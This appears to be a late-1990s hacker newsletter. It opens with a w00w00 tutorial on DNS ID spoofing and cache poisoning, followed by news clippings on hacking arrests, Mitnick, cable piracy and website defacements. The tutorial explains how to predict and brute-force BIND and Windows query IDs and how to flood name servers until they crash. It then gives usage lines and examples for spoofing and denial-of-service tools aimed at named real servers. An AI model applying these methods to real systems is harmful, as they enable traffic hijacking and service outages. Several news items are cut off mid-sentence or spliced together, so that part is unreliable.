     | number of RR authoritative = 0  | number of supplementary RR = 0        |
     +---------------------------------+---------------------------------------+
     +-------------------------------------------------------------------------+
     |   name  of the question = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]               |
     +-------------------------------------------------------------------------+
     |   type of question = htons(1)   |      type of query = htons(1)         |
     +-------------------------------------------------------------------------+
     +-------------------------------------------------------------------------+
     |   name of the domain = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                  |
     +-------------------------------------------------------------------------+
     |       type        = htons(1)    |      class    = htons(1)              |
     +-------------------------------------------------------------------------+
     |                       time to live = 999999                             |
     +-------------------------------------------------------------------------+
     | resource data length = htons(4) | resource data=inet_addr("31.33.7.44") |
     +-------------------------------------------------------------------------+
     
     Yah! That's all for now :))
      
     Here is an analysis:
     In the answer QR = 1 because it's an answer :)
     AA = 1 because the name server has authority in its domain
     RA = 1 because recursion is available
     
     I hope you understood that because you will need it for the following
     events.
     
     --[2.0]-- DNS ID hack/spoof
     
     Now it's time to clearly explain what DNS ID hacking/spoofing is.
     Like we explained before, the only way for the DNS to recognize the
     different questions/answers is the ID flag in the packet. Look at this
     example:
     
     ns.bibi.com;53 ----->[?www.heike.com] ------> ns.heike.com:53
     
     So you only have to spoof the ip of ns.heike.com and answer your false
     information before ns.heike.com does first!
     
     ns.bibi.com <------- . . . . . . . . . . .  ns.heike.com 
                        |
                        |<--[IP for www.heike.com is 1.2.3.4]<-- hum.roxor.com 
     
     But in practice you have to guess the good ID. If you are on a LAN, you
     can sniff to get this ID and answer before the name server (it's easy on a
     Local Network :)
     
     If you want to do this remotely you don't have a lot a choices, but you
     do have 4 basic methods:
     
     1.) Randomly test all the possible values of the ID flag. You must answer
         before the NS (ns.heike.com in this example)! This method is obsolete
         unless you want to know the ID or any other favorable condition to
         its prediction.
     
     >>> This method is not obsolete --- it's how real attacks work. It
         takes less than a minute on a DS1 to exhaustively search all the
         ID's, and if you flood (or crash) the authority servers for the
         resource record you're trying to inject, you have all the time 
         in the world to do it. This is the problem that the current DNS
         protocol can't fix.
     
     2.) Send some DNS requests (200 or 300) in order to increase the chances
         of falling on the good ID.
     
     >>> This is analogous to using 200 or 300 responses (both consume ID 
         space), except that naieve DNS servers might not detect 300 queries,
         even if they do detect 300 wrong answers.
     
     3.) Flood the DNS in order to avoid its work. The name server will crash
         and show the following error!
     
         >> Oct 06 05:18:12 w00w00 named[1913]: db_free: DB_F_ACTIVE set - ABORT
            at this time named is out of order :)
     
     4.) Or you can use the vulnerability in BIND discovered by SNI (Secure
         Networks, Inc.) with ID prediction (we will discuss this in a bit).  
     
     
     ##################### Windows ID Vulnerability ###########################
     
     I haven't tested this on WinNT, but Windows ID's are extremely easy to
     predict because it is '1' by  default, and '2' for the second question (if
     they are 2 questions at the same time).
     
     
     ######################## BIND Vulnerability ##############################
     
     There is a vulnerability in BIND (discovered by SNI as stated earlier)
     
     >>> we didn't discover this; it's old news. We released an advisory on
     >>> how much easier it is to exploit than the old papers let on. 
     
     that we will be using. In fact, DNS IDs are easily predictable; you only
     have to sniff a DNS in order to do what you want. Let me explain...
     
     The DNS uses a random ID at the beginning but it only increases this ID
     for the next question.
     
     It's easy to exploit this vulnerability.
     Here is the way:
     
     1. Be able to sniff easily the messages that comes to a random DNS (ex.
        ns.dede.com for this sample).
     
     2. You ask NS.victim.com to resolve &lt;whatever>.dede.com, and NS.victim.com
        will ask ns.dede.com to resolve &lt;random>.dede.com
     
        ns.victim.com ---> [?&lt;random>.dede.com ID = 444] ---> ns.dede.com
     
     3. Now we have the ID of the message from NS.victim.com, now you know what
        ID area you'll have to use. (ID = 444 in this sample).
     
     4. You then make your resolution request. ex. www.microsoft.com to
        NS.victim.com
        
        (you) ---> [?www.microsoft.com] ---> ns.victim.com
     
        ns.victim.com --> [?www.microsoft.com ID = 446 ] --> ns.microsoft.com
          
     5. Flood the name server ns.victim.com with the ID (444) you already have and
        then you increase this by one.
     
      ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 444] --> ns.victim.com
      ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 445] --> ns.victim.com
      ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 446] --> ns.victim.com
      ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 447] --> ns.victim.com
      ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 448] --> ns.victim.com
      ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 449] --> ns.victim.com
     
     
     Now you know that DNS IDs are predictable, and they only increase. You
     flood ns.victim.com with spoofed answers with the ID 444+ ;)
     
     >>> That's not true on OpenBSD (random scoreboarded IDs). 
     
     [Note: WSDspoofID does this]
     
     There is another way to exploit this vulnerability without a root on
     any NS.
     
     The mechanism is very simple. Here is the explanation:
     
     We send to ns.victim.com a resolution request for *.provnet.fr
     
     (you) ----------[?(random).provnet.fr] -------> ns.victim.com
     
     Then, ns.victim.com asks ns1.provnet.fr to resolve &lt;random>.provnet.fr.
     There is nothing new here, but this is where the interesting part begins
     here.
     
     At this point you begin to flood ns.victim.com with spoofed answers
     (with ns1.provnet.fr IP) with IDSs from 100 to 110:
     
     (spoof) ----[&lt;random>.provnet.fr is 1.2.3.4 ID=100] --> ns.victim.com 
     (spoof) ----[&lt;random>.provnet.fr is 1.2.3.4 ID=101] --> ns.victim.com 
     (spoof) ----[&lt;random>.provnet.fr is 1.2.3.4 ID=102] --> ns.victim.com 
     (spoof) ----[&lt;random>.provnet.fr is 1.2.3.4 ID=103] --> ns.victim.com 
     ...
     
     After that, we ask ns.victim.com if &lt;random>.provnet.fr has an IP address.
     
     If ns.victim.com give us an IP address for &lt;random>.provnet.fr then we
     have found the correct! Otherwise, we have to repeat this attack until
     we find the ID. It's a bit long but it's effective. 
     
     [Note: This is how WSD-IDpred works]
     
     
     ########################################################################## 
     
     Here you will find 5 programs
     WSDkillDNS   - very simple DNS spoofer
     WSDsniffID   - sniff a LAN and reply false DNS answers before the NS
     WSDspoofID   - a DNS ID spoofer (you'll need to be root on a NS)
     WSD-IDpred   - a DNS ID predictor (no need to be root on a NS)
     WSD-baddns   - a very simple denial of service attack to disable DNS
     
     Note: You can find source and binaries of these programs at 
     ftp.w00w00.org/pub/DNS. You need to install libpcap on your machine before
     any compilation of the w00w00 ID programs.

     /* I'm a w00w00ify'd w00c0w */
     
     
     Here is a HOWTO on the w00w00 ID tools:
     ----[HOWTO]----
     
     I've decided to make a little HOWTO because the w00w00 ID tools are not
     very user friendly for a beginner :)
     
     1: WSD-baddns
     WSD-baddns is a program to destroy the DNS.
     
     It's very, very simple to use !!! :) 
     
     /* I'm a w00w00ify'd w00c0w */
     
     Usage: WSD-baddns &lt;victim>
     Example: WSD-baddns bob.lenet.fr
     
     
     
     2: WSDsniffID 
     WSDsniffID is a DNS hijacker. You need to have root privileges. It's
     for a LAN only :)
     
     Usage:  
     WSDsniffID &lt;device> &lt;spoof IP> &lt;spoof NAME> [type 1 or 12 ] 
     
     '' by type we mean 1 = TYPE A  12 = TYPE PTR ''
     
     Example:
     WSDsniffID eth0 31.3.3.7 www.i.m.mucho.horny.ya 12 (We are hijacking a PTR)
     
     So now if someone runs "nslookup &lt;one ip>" on a network they have: 
     
     [root@w00w00 w0w0w]# nslookup  1.2.3.4
     Server:  localhost
     Address:  127.0.0.1
     
     Name:    www.i.m.mucho.horny.ya
     Address:  1.2.3.4
     
     
     
     3: --= WSDspoofID =--
     
     1) Before you need root on a NS with AUTH over a domain (for example
     shok.janova.org has authority over *.janova.org)
     
     WSDspoofID is a DNS ID predictor  (but you need to have root on a NS or
     you need to the privileges to sniff the NS)
     
     Usage:
     WSDspoofID &lt;device to spoof> &lt;NS victim> &lt;your domain> &lt;ip of your dns>
     &lt;type (1,12)> &lt;spoof name> &lt;spoof ip> &lt;ns with auth on spoof ip or name>
     
     Example:
     WSDspoofID ppp0 NS2.MCI.NET janova.org shok.janova.org 12 
                www.i.m.ereet.ya 194.206.23.123  ns2.provnet.fr ..
     
     
     Well after that when you ask NS2.MCI.NET for 194.206.23.123 you have:
     
     [root@w00w00 w0w0w]# nslookup 194.206.23.123  ns2.mci.net
     Server:  ns2.mci.net
     Address:  204.70.57.242
     
     Name:    www.i.m.ereet.ya
     Address:  194.206.23.123
     
     [root@w00w00 w0w0w]#
     
     We will use ns2.provnet.fr because ns2.provnet.fr has AUTH on 194.206.23.* 
     
     To find out who has AUTH on 194.206.23.*, you just need to do the
     following:
     
     [root@w00w00 w0w0w]# host -t NS 23.206.194.in-addr.arpa
     23.206.194.in-addr.arpa name server NS2.PROVNET.FR
     23.206.194.in-addr.arpa name server BOW.RAIN.FR
     23.206.194.in-addr.arpa name server NS1.PROVNET.FR
     [root@w00w00 w0w0w]#
     
     To find out the NS who haas AUTH on, for example, *.provnet.fr:
     
     [root@w00w00 w0w0w]# host -t NS provnet.fr
     provnet.fr name server NS1.provnet.fr
     provnet.fr name server BOW.RAIN.fr
     provnet.fr name server NS2.provnet.fr
     [root@w00w00 w0w0w]#
     
     Note: The entry can change!!! You can get NS1 first.

     2 charged for hacking U.S. computers

     STOCKHOLM, Sweden (AP) -- Two Swedish men were charged
     Monday with hacking into the computer systems of NASA and the U.S.
     military. 

     Prosecutors said the intent apparently was not to steal anything, though
     NASA reportedly spent a lot of money to make sure it didn't happen
     again. 

     State prosecutor Yngve Rydberg called the crimes ''digital graffiti.'' Trial
     was set for sometime this fall. Rydberg said he expected the two suburban
     Stockholm men would be fined, but not jailed. 

     Charlie Malm and Joel Soederberg, both 24, were charged with violating
     Sweden's computer laws and buying stolen equipment. Malm works at a
     kindergarten, Rydberg for an Internet company. 

     Contacted by The Associated Press, Soederberg declined to comment.
     Malm did not return a phone call placed to his home. 

     The NASA break-in allegedly occurred between October and December
     1996. Soederberg was detained for two weeks in early 1997. Malm has
     never been detained, Rydberg said. 

     ''They didn't reach the holiest parts of the systems,'' he said, adding they
     failed in an attempt to infect NASA's computer system with a virus. 

     The two also allegedly hacked into the computer systems of the U.S. Air
     Force, Army and Marines, and the British Internet company Wide
     Intellectual Resources, according to the charges. 

     NASA intends to demonstrate in the trial that Malm and Soederberg
     ''caused NASA great economic loss,'' court documents stated. 

     Thomas Talleur, director of NASA's computer crime unit, said the space
     agency suffers a lot of intrusions. 

     ''Anybody who provides as many open sites as we do leaves itself open to
     attacks,'' he said in a telephone interview, adding that the agency mostly
     investigates hacker intrusions when organized crime is suspected.

      The feds are delaying a joint AT&T and British telecom
      venture that would create a transatlantic telecom
      network. Apparently the feds want to make sure they
      have access to the network for wiretapping purposes
      and to protect U.S. citizens against monitoring by
      foreign governments. (For some reason I don't buy the

      DOJ, FBI delay AT&T-BT plans
      By Kathy Chen and Rebecca Blumenstein, WSJ Interactive Edition
      August 16, 1999 2:32 PM PT
      URL: 
      
      U.S. officials are reviewing a planned joint venture between AT&T Corp. and British
      Telecommunications PLC for its possible effects on law enforcement and national security,
      delaying approval of the trans-Atlantic telecom agreement. 
      
      The Federal Bureau of Investigation and the Department of Justice's criminal division are holding
      talks with the companies to resolve concerns over the plan to form a $10 billion global venture,
      people familiar with the situation said.
      
      The review appears to be part of a larger trend of law-enforcement agencies weighing in on
      telecommunications deals. While the Federal Communications Commission traditionally has
      overseen approval of such deals, the law-enforcement agencies may want to ensure they have
      access to telecom networks for approved wiretapping operations, as well as that U.S. citizens are
      protected against monitoring by foreign governments.
      
      Growing investments by foreign companies and the introduction of new phone technologies are
      complicating their efforts. The result has been increased participation by the agencies in vetting
      telecom deals -- and delays for the companies.
      
      Down but not out
      While the agencies' concerns aren't likely to scuttle the AT&T-BT alliance, they are holding up its
      approval. FCC officials have completed their review of the venture, which was announced in July
      1998, but are awaiting word from the Justice Department and FBI, which have been in talks with
      the firms for more than two months, according to people familiar with the situation.
      
      Both AT&T (NYSE:T) and BT declined to comment on whether they are involved in talks with
      law-enforcement agencies. But AT&T spokesman Jim McGann said, "We continue to believe
      approval of the deal is on track." The firms have said they would like to wrap up the deal by
      October.
      
      The Justice Department and FBI said they don't comment on specific cases.
      
      The AT&T-BT venture aims to provide international companies with voice, video and data
      services. The companies are combining international operations with about $10 billion in annual
      revenue. European regulators, which recently have begun looking at telecom deals more carefully,
      have approved the venture.
      
      The specific nature of the FBI and Justice Department concerns remains unclear. If several past
      and continuing cases offer any clue, they are likely to involve the agencies' desires to ensure
      continued access to telecom networks for wiretapping purposes and to protect the privacy of U.S.
      citizens.
      
      In one of the first cases addressed by the agencies -- BT's planned acquisition of MCI
      Communications announced in 1996 -- the FBI and Justice Department required the companies to
      set up a separate subsidiary to take over all of MCI's business with U.S. government agencies.
      The agencies also asked the companies to implement other security measures, such as agreeing
      not to store billing information outside the U.S. for a certain period of time. That information is
      sometimes subpoenaed by law-enforcement officials for criminal investigations, and storage in the
      U.S. would facilitate continued access. The deal later fell through for unrelated reasons.
      
      Law-enforcement agencies recently approved a merger between AirTouch Communications Inc.
      and United Kingdom-based Vodafone, now Vodafone AirTouch PLC. AirTouch spokesman
      Jonathan Marshall said the companies engaged in several months of negotiations with the agencies
      over how to address security issues and agreed to conditions aimed at guaranteeing the
      government's right to intercept communications over their U.S. wireless networks.

               - Steven Branigan & Bill Cheswick 
      Starting at the end of March, we mapped the Yugoslavian network daily. A chart of the reachability shows that the network
      was pretty stable until about May 3, 1999. Then, it changed drastically. 

      Below are some single day network map snapshots for the period from May 1st until May 10. As you can see from the
      maps, a fair amount of the Yugoslavian network disappears and subsequently reappears on a daily basis. 

      We also mapped Bosnia during this period. Though our traces showed no common communication routes, quite a bit of
      Bosnia went away at the same time. We suspect that the two countries probably share power grid connections.

       Hacking your way to an IT career
                  By Ann Harrison


      ALTLANDSBERG, GERMANY -- At the first annual
      Chaos Communication Camp, which took place outside
      of Berlin last weekend (see story), hundreds of hackers
      and their machines filled the main hack tent exchanging
      information on the latest exploits and security tools. Most
      were young, skillful and in demand by corporate
      information technology departments. 

      The camp, which attracted some of the most talented
      European and American hackers, was one of the largest
      hacker gatherings in Europe so far this year. 

      David Del Torto, director of technology for security
      services at Deloitte & Touche in San Francisco, agreed.
      He noted that hackers like himself were working at all
      the top five auditing and accounting firms. 

      Del Torto presented hacker career workshops with titles
      such as "Take This Job and Ping It/Hacking The
      Corporate Ladder For Fun & Profit." 

      The following are some of the tips he offered hackers
      seeking corporate jobs: 

         - Write your own job description. 

         - Volunteer for a project in your area of expertise. 

         - Network with people. 

         - Start your own company. 

           Or sign on to another start-up.

      He also advised the crowd to build tools they themselves
      would use ("You should be customer No. 1!"), license
      technology when appropriate and solve problems with
      free software or generate it. 

      "When building reputation capital, it's pretty important to
      learn to think like the boss,'' he said. 

      In addition to his day job, Del Torto is a member of the
      Cypherpunks, a San Francisco-based hacking
      organization that produces what he calls
      "no-compromise" security technology. 

      Del Torto had advice for his Fortune 1000 brethren, too.
      Asked if young hackers, who may not be partial to suits
      and ties, are discriminated against, Del Torto recalled
      that Dan Farmer, author of the widely used Satan
      network scanning tool, was once turned down by a
      prospective employer who found his appearance
      unsettling. He urged IT managers to avoid superficial
      judgments and focus on the reputation of the individual.
      IT managers interviewing young people who "act
      differently" should remember when they were young, he
      advised. 

      Del Torto noted that in the relatively small community of
      IT security professionals, people are preceded by their
      reputations. He said he knows programmers who are
      talented, but he won't hire or recommend them because
      they don't act responsibly.

      Alien hunter breaks record 

      The massive Arecibo telescope is collecting the data 

      By BBC News Online Science Editor Dr David
      Whitehouse 

      The SETI@home screensaver project, which allows
      anyone with a desktop computer to join the search for
      intelligent life in space, is now the largest computation
      ever done, on Earth at least. 

      Since May, over a million people have downloaded the
      SETI@home screensaver. But, despite an accumulated
      50,000 years of computer time, no signs of alien life have
      yet been found. 


                          The SETI@home program
                          has infiltrated homes, offices
                          and classrooms in 223
                          countries, "It is truly a
                          phenomenon," said
                          SETI@home project director
                          David Anderson. "One person
                          runs it in an office and pretty
                          soon the whole office is doing
                          it." 

                          Companies large and small
      (including the BBC) as well as schools and universities
      have formed groups to compete to see whose computers
      can analyse the most chunks of data. 

      The program acts like a screen saver, starting when the
      computer is idle and analysing data collected from the
      Arecibo radio telescope in Puerto Rico. 


                          The analysis is done
                          automatically and the results
                          are sent back to the
                          University of California at
                          Berkeley, while participants
                          can see the progress on the
                          computer screen. 

                          Number cruncher

                          According to Professor
                          Anderson it proves the value
                          of distributed computing and
                          it has encouraged him to
      look around for other projects that could benefit from this
      technique. 

      "SETI@home is now the largest computation ever done
      on this planet, we have accumulated more than 50,000
      years of computing time so far," said project scientist
      Dan Werthimer, a research physicist at the University of
      California Berkeley's Space Sciences Laboratory. 

      "This also is the most sensitive sky survey ever
      conducted," Professor Werthimer added. SETI@home is
      so powerful because we are using the world's largest
      telescope and we are able to use it continuously, 24
      hours a day, by piggybacking on other observations." 

      Of the million people who have downloaded the software
      about 600,000 have completed at least one unit of data
      analysis. 

      Analysts say that the backlog of data from the Arecibo
      telescope is rapidly disappearing, and Professor
      Anderson and his team are currently updating the
      software to analyse the data again to search for more
      complex signals.

      The Hacker Hoax
      By Neil Taylor, IT Daily.
      August 18, 1999

      The world's press might have been fooled into believing that
      a Chinese hacker group plans to bring down the country's
      information infrastructure. According to stories that began
      circulating in July last year, the rogue group, the Hong Kong
      Blondes, is made up of dissidents both overseas and within
      the Chinese Government.

      The rumours began when an interview with the group's
      leader was published by US hacking group the Cult of the
      Dead Cow (CDC) at http://www.cultdeadcow.com . In the
      interview, illusive Hong Kong Blondes director Blondie
      Wong said that he had formed an organization named the
      Yellow Pages, which would use information warfare to
      attack China's information infrastructure.

      The group threatened to attack both Chinese state
      organizations and Western companies investing in the
      country. For their part, the CDC claimed that they would
      train the Hong Kong Blondes in encryption and intrusion
      techniques.

      One year after the group's supposed launch, there is no
      evidence that the Hong Kong Blondes ever existed. In fact,
      all evidence appears to indicate that the Hong Kong Blondes
      report was a highly successful hoax.

      The story was first reported in Wired magazine, and during
      the past year has been followed up by numerous publications
      including USNews, the Los Angeles Times, Asiaweek and
      ComputerWorld. In every case, the original source was the
      CDC's July interview.

      The CDC is best known for its remote administration tool
      Back Orifice. BO can be installed on a Windows PC without
      the user's knowledge, giving full control over the machine to
      unauthorized third parties.

      The first version of Back Orifice was released a month after
      the Blondes story was leaked to Wired magazine.

      Repeated attempts to contact the CDC failed to elicit a
      response, and despite inquiries throughout the Hong Kong
      technology and security industries, not one person contacted
      had ever come across any evidence of the group's existence.

      The Hong Kong Police, which is responsible for tracking
      hacking activities locally, had no knowledge of the group.
      Detective senior inspector Martyn Purbrick, of the
      Commercial Crime Bureau's Computer Crime Section, said
      that there had been no official reports of the group's
      activities. He added that he only knew the group's name
      through reports in the media.

      Stephen Mak, principal assistant secretary of the information
      technology and broadcasting bureau, said, "We have carried
      out inquiries both within the government as well as with the
      ISPA, but we could find no information about the group."

      Samuel Chanson, director of the Cyberspace Centre at the
      Hong Kong University of Science and Technology, said the
      threats would take no great skill to carry out. "Hacking into
      almost any major server is do-able with some training."

      Chanson said that a group of his undergraduate students
      took a two-day course in intrusion techniques, after which
      they were able to break into several hundred servers in
      campus tests. "We checked how good their network security
      was and succeeded in bringing down a good number of their
      servers as well as gaining important information... Attacking
      the general commercial server is not a difficult task."

      Early this year, a US hacker group, the Legion of the
      Underground (LoU) at http://www.legions.org , launched a
      declaration of infowar on China, in response to the harsh
      penalties handed out for computer offenses in the country.
      LoU members cited the Hong Kong Blondes as an influence
      behind their short-lived war, which was abandoned following
      condemnation from other hacker groups. However, a large
      number of Chinese Web sites were hacked by protesters,
      including Hongkong.com, China Window, Wenjin Software
      and the semi-official China Society for Human Rights
      Studies.

      CDC remains tight-lipped on the issue. But publishers might
      do well to remember a statement made by the group in its
      Media Domination Global Update: "We intend to dominate
      and subvert the media wherever possible."

                                  Mr Horta said
                                  about a dozen
                                  viruses were
                                  being designed to
                                  infect computers
                                  if there is fraud in
                                  the 30 August
      ballot on the territory's future. 

      The Nobel laureate warned that a 100-strong team of
      hackers in Europe and North America had prepared a
      campaign that would cause economic devastation to
      Indonesia. 


                          Their targets would include
                          computers controlling
                          banking, finance, the military
                          and aviation, he said in a
                          commentary in Australia's
                          Sydney Morning Herald. 

                          "One computer wizard
                          recently told me, 'We will
                          terminate their banking
                          system. We will invade their
                          sites and destroy them...We
                          will cause them to lose
                          hundreds of millions of
      dollars'," he added. 

      Electoral fraud 

      The warnings come as East Timor prepares to choose
      between Jakarta's offer of autonomy or full
      independence. 


                    The United Nations which is
                    overseeing the ballot says it is
                    confident there will be a free and fair
                    vote. 

                    But Mr Horta has warned that the
                    ballot could turn into the biggest
      electoral fraud in modern times. 

      He said Indonesia's army intended to get a
      pro-integration vote through by terror and fraud. 

      Mr Horta alleged that a violent campaign by pro-Jakarta
      militias had already 

           cost over 1,000 lives 

           razed entire villages 

           uprooted 80,000 people 

      He said the vote was also compormised by 

           a ban on detained resistance leader Xanana
           Gusmao and himself during the campaigning 

           continued Indonesian army support for the militias

           a biased Indonesian controlled East Timorese
           media 

      "All this makes for an extremely dangerous situation.
      Full-scale violence before or after the ballot is now
      almost certain," Mr Horta added. 


                          ''The next phase of
                          resistance will be much more
                          desperate and ferocious and
                          will not be contained to East
                          Timor," he added. 

                          Mr Horta's comments came
                          as Amnesty International
                          also warned that Indonesia's
                          failure to halt the bloodshed
                          in East Timor - mainly by
                          pro-Jakarta militias -
                          threatened to prevent a fair
                          ballot. 

      Indonesia invaded East Timor, a former Portuguese
      colony, in 1975 and annexed it the following year in a
      move not recognised by the UN. 

      Human rights groups say more than 200,000 people
      died, many of them from starvation, in the years since
      the invasion.

42.0 Mitnick Still Denied Kosher Food

      In continuing violation of Constitutional Law, Kevin
      Mitnick is still being denied the ability to practice his
      religion by not being served kosher foods. A rabbi for
      the San Bernardino County Detention Center has
      confirmed that the center does not provide kosher
      meals. Kevin has started eating the vegetarian meals
      provided by the prison as an alternative, even though
      they are not kosher.

      Life Not Kosher for Mitnick
      by Douglas Thomas 
      
      12:15 p.m.  18.Aug.99.PDT
      Jailed computer hacker Kevin Mitnick wants out of his current facility because it doesn't serve kosher food. 
      
      Mitnick wouldn't eat for the first two days of his stay at the San Bernardino County Detention Center after being transferred there from the Los
      Angeles Metropolitan Detention Center. 
      
      
      He only recently began eating the jail's vegetarian meals, which it offers as a substitute. But those meals don't meet rabbinical standards. 
      
      Mitnick insists that maintaining a kosher diet is extremely important to him. 
      
      "This is a violation of my constitutional rights," Mitnick said. "I'm being forced into a situation where I have to violate my religious beliefs or starve." 
      
      Complicating the move, Mitnick said, is that his MDC-stored money won't be available for several weeks, making it impossible for him to buy
      commissary food. In addition, he said, prices are triple what they were at the old facility. 
      
      Mitnick's rabbi, Aaron Kriegal, and the rabbi for the San Bernardino County Detention Center, Hillel Cohn, confirmed that the SBCDC does not serve
      kosher meals to Jewish inmates. 
      
      "Does it make life more difficult? Yes," Cohn said. "But being in prison is difficult. It wasn't meant to be a country club. There are some sacrifices
      inmates have to make." 
      
      Cohn said returning Mitnick to Los Angeles would "make life easier" for Mitnick, but did not believe that the move was likely. 
      
      "This is not the first request we've had to have an inmate transferred for this reason," Cohn said. 
      
      At sentencing, Mitnick's attorney failed to persuade US District Judge Marianne Pfaelzer that Mitnick serve his time at the MDC to ensure his access
      to kosher meals. 
      
      Currently, Mitnick shares one large cell with approximately 60 other inmates, each of whom is issued a small mattress, sheet, and blanket. The cell
      contains one toilet and one shower, each in open view of the cell. 
      
      Mitnick calls the conditions "dehumanizing." 
      
      Mitnick is expected to spend four to six weeks at the San Bernardino facility while awaiting final designation, most likely to Nellis Prison Camp just
      outside of Las Vegas. 
      
      Mitnick's attorneys have filed a motion with the court requesting that he be transferred back to the MDC until the Bureau of Prisons decides where
      he will serve the remainder of his 46-month prison sentence. 
      
      Because of previous time served, Mitnick is expected to be released in January 2000.

      many get cable TV for free, audit finds 
     
      MediaOne pulls plug on thousands
     
      By Bruce Mohl, Globe Staff, 08/18/99 
     
           In a street-by-street survey in Eastern Massachusetts, the state's largest cable television
           company is finding that thousands of people are getting cable but not paying for it.
     
      Of 162,000 non-customer homes or apartments checked so far by MediaOne, 14 percent, or
      nearly 23,000, were receiving an unauthorized cable TV signal. In most cases, the signal was either
      stolen or left on inadvertently by MediaOne.
     
      MediaOne is not taking the freeloaders to court or demanding back payment. Instead, the company
      is disconnecting the unauthorized service and politely urging the consumer to start paying for it. So
      far, about 16 percent have done so. 
     
      ''It's an amnesty kind of deal,'' said John Fouhy, director of security for MediaOne in the Northeast.
      ''We don't consider it stealing or illegal. It's just not in our billing system.''
     
      Fouhy declined to identify where the problem is most severe, saying he did not want to cast
      aspersions on any particular community. But he said it is more pronounced in urban areas with
      apartment buildings where people tend to move in and out a lot. MediaOne serves most of Eastern
      Massachusetts except for Boston, Brookline, and Braintree.
     
      ''Leafy suburbs tend to have lower unauthorized rates,'' Fouhy said.
     
      At a time when MediaOne is rapidly building a sophisticated network to carry high-speed Internet
      access and local phone service in addition to cable TV, the fact that thousands of people are getting
      cable for free cannot do the company's high-tech image any good.
     
      But Fouhy said he was not surprised by the numbers, given what companies in other parts of the
      country have found with similar audits. He said that some people are stealing the signal and in other
      cases are just taking advantage of MediaOne's failure to shut previous service off.
     
      He gave the example of someone in Cambridge who is paying for cable TV and moves out of the
      apartment. Rather than send a technician to the apartment to shut service off, Fouhy said,
      MediaOne and the companies it has acquired in recent years often leave service on for the tenant
      moving in. That way service can start immediately with little or no installation cost for both the
      consumer and the company.
     
      ''In most instances, people understand cable doesn't come with the house,'' Fouhy said.
     
      But apparently all too often the new tenant would just plug his cable wire into his TV set or
      videocassette recorder and start watching CNN.
     
      Fouhy said the survey began in March and is scheduled to end in October and then resume again
      next year. It has focused mostly on communities where ''churn'' - turn-ons and turn-offs of cable
      service - is high or where cable penetration seems unusually low. In those communities, Fouhy said,
      MediaOne has hired contractors to go street by street to check whether noncustomers are
      receiving cable TV service. Fouhy said the surveyors do not go inside homes.
     
      The MediaOne survey is not designed to track down people who are using black boxes to illegally
      pirate premium cable channels, a problem that Fouhy described as ''significant.'' Industrywide, he
      said, cable companies are losing more than $5 billion a year in pirated premium and pay-per-view
      channels. MediaOne officials declined to comment on what tactics they are using to eliminate this
      fraud.
     
      In such an extensive audit, accidents apparently happen. Susanna Joannidis of Cambridge, who
      owns a single-family home and is up-to-date on her monthly MediaOne bill, said she and a
      neighbor lost their cable service early last month. It took almost two days to figure out that a
      technician had shut off the wrong service, causing Joannidis to miss the finals of Wimbledon that she
      had been eagerly anticipating.
     
      Joannidis said she thought it was strange that MediaOne does not know who its customers are.
      MediaOne sent Joannidis a letter of apology and gave her a $110 credit.

      MediaOne Sting Operation Nabs
      Web-Based Cable Pirates; Moreno Valley
      Police Department Raid Nets More Than
      $1 Million in Illegal Equipment 

      EL SEGUNDO, Calif., Aug 18, 1999 (BUSINESS WIRE
      via COMTEX) -- OnWednesday, MediaOne(R) and the
      Moreno Valley Police Department executed three
      early-morning search warrants, raiding private homes in
      Riverside County, Calif., and uncovering evidence of a
      multimillion-dollar national cable-piracy operation that
      had been conducted over the Internet. 

      The raid netted more than a million dollars' worth of
      "black boxes," the descrambling device that enables
      users to illegally access cable-TV channels, as well as
      master computer chips that could be cloned for new
      black boxes, and shipping and billing evidence. 

      Charles Balan, 28 years old, of Romoland, Calif., and
      Brian Fulk, 24 years old, of Moreno Valley, were
      arrested and are facing felony charges. A third suspect
      is still at large. The extensive computer equipment from
      their operations, called Cable Converter Concepts and
      Hi-Tech Converter Labs, was confiscated, and their
      Web sites were shut down. 

      Theft of service is one of the biggest problems faced by
      cable companies today. It is estimated that this
      criminal activity costs the industry and its customers
      more than $5.8 billion annually. Not only is this cost
      passed on to honest customers, but the quality of their
      service is also diluted by the illegal hardware. 

      Cities themselves also lose millions in franchise fees --
      the monthly, subscriber-based revenues paid to them
      by cable-TV companies. 

      "The success of today's operation is a perfect example
      of what occurs when you have a cooperative effort
      between private industry and law enforcement," said
      Sgt. Joseph Cleary, supervisor in charge of the
      search-warrant execution. 

      "We're getting the message out that we won't tolerate
      this kind of criminal activity," said Mike Bates, director
      of security for MediaOne. "Abuse of e-commerce via
      the Internet is a nationwide problem that affects cities,
      companies and private citizens alike." 

      MediaOne Group (NYSE:UMG) is one of the world's
      largest broadband-communications companies,
      bringing the power of broadband and the Internet to
      customers in the United States, Europe and Asia. The
      company also has interests in some of the
      fastest-growing wireless-communications businesses
      outside the United States. 

      For 1998, the businesses that constitute MediaOne
      Group produced $7.1 billion in proportionate revenue.
      On May 6, 1999, the company entered into an
      agreement to merge with AT&T.

44.0 CSIS Admits Web Defacement

      The Canadian Security Intelligence Service has admitted

      spy agency admitted that its web page had been

      released by the agency that discuss cyber warfare.

      Hackers altered its Web page, CSIS reports
      Terrorists could cripple societies, start wars
      by invading cyberspace, spy agency warns

      JEFF SALLOT
      Parliamentary Bureau
      Wednesday, August 18, 1999

      Ottawa -- Computer hackers altered the logo on the Canadian Security Intelligence Service's Web page to
      read "Canadian Security Illegal Service" within days of the site going up on the Internet, the spy agency says.

      This act of cyberspace vandalism was quickly cleaned up, and there is no evidence the hackers ever got into
      the agency's top-secret internal computer network, CSIS says.

      But the incident is a warning about how hackers can manipulate data from long distances, CSIS says in a new
      background paper describing trends in international terrorism and warning that cyberattacks might cripple
      modern societies.

      The background paper was released yesterday and is the service's first public disclosure of the 1996 incident
      involving its own Web page.

      CSIS spokesman Dan Lambert said the Web sites of several other federal government departments were also
      hit at about the same time.

      An investigation was conducted, but CSIS will not disclose the results.

      The background paper warns that as modern countries become increasingly dependent on computer-based
      communication, "future wars could involve cyberattacks on information infrastructure."

      Canada is particularly vulnerable because of its heavy reliance on these advanced technologies.

      "If teenagers can compromise networks using basic skills and tools available on the Internet, the concern is
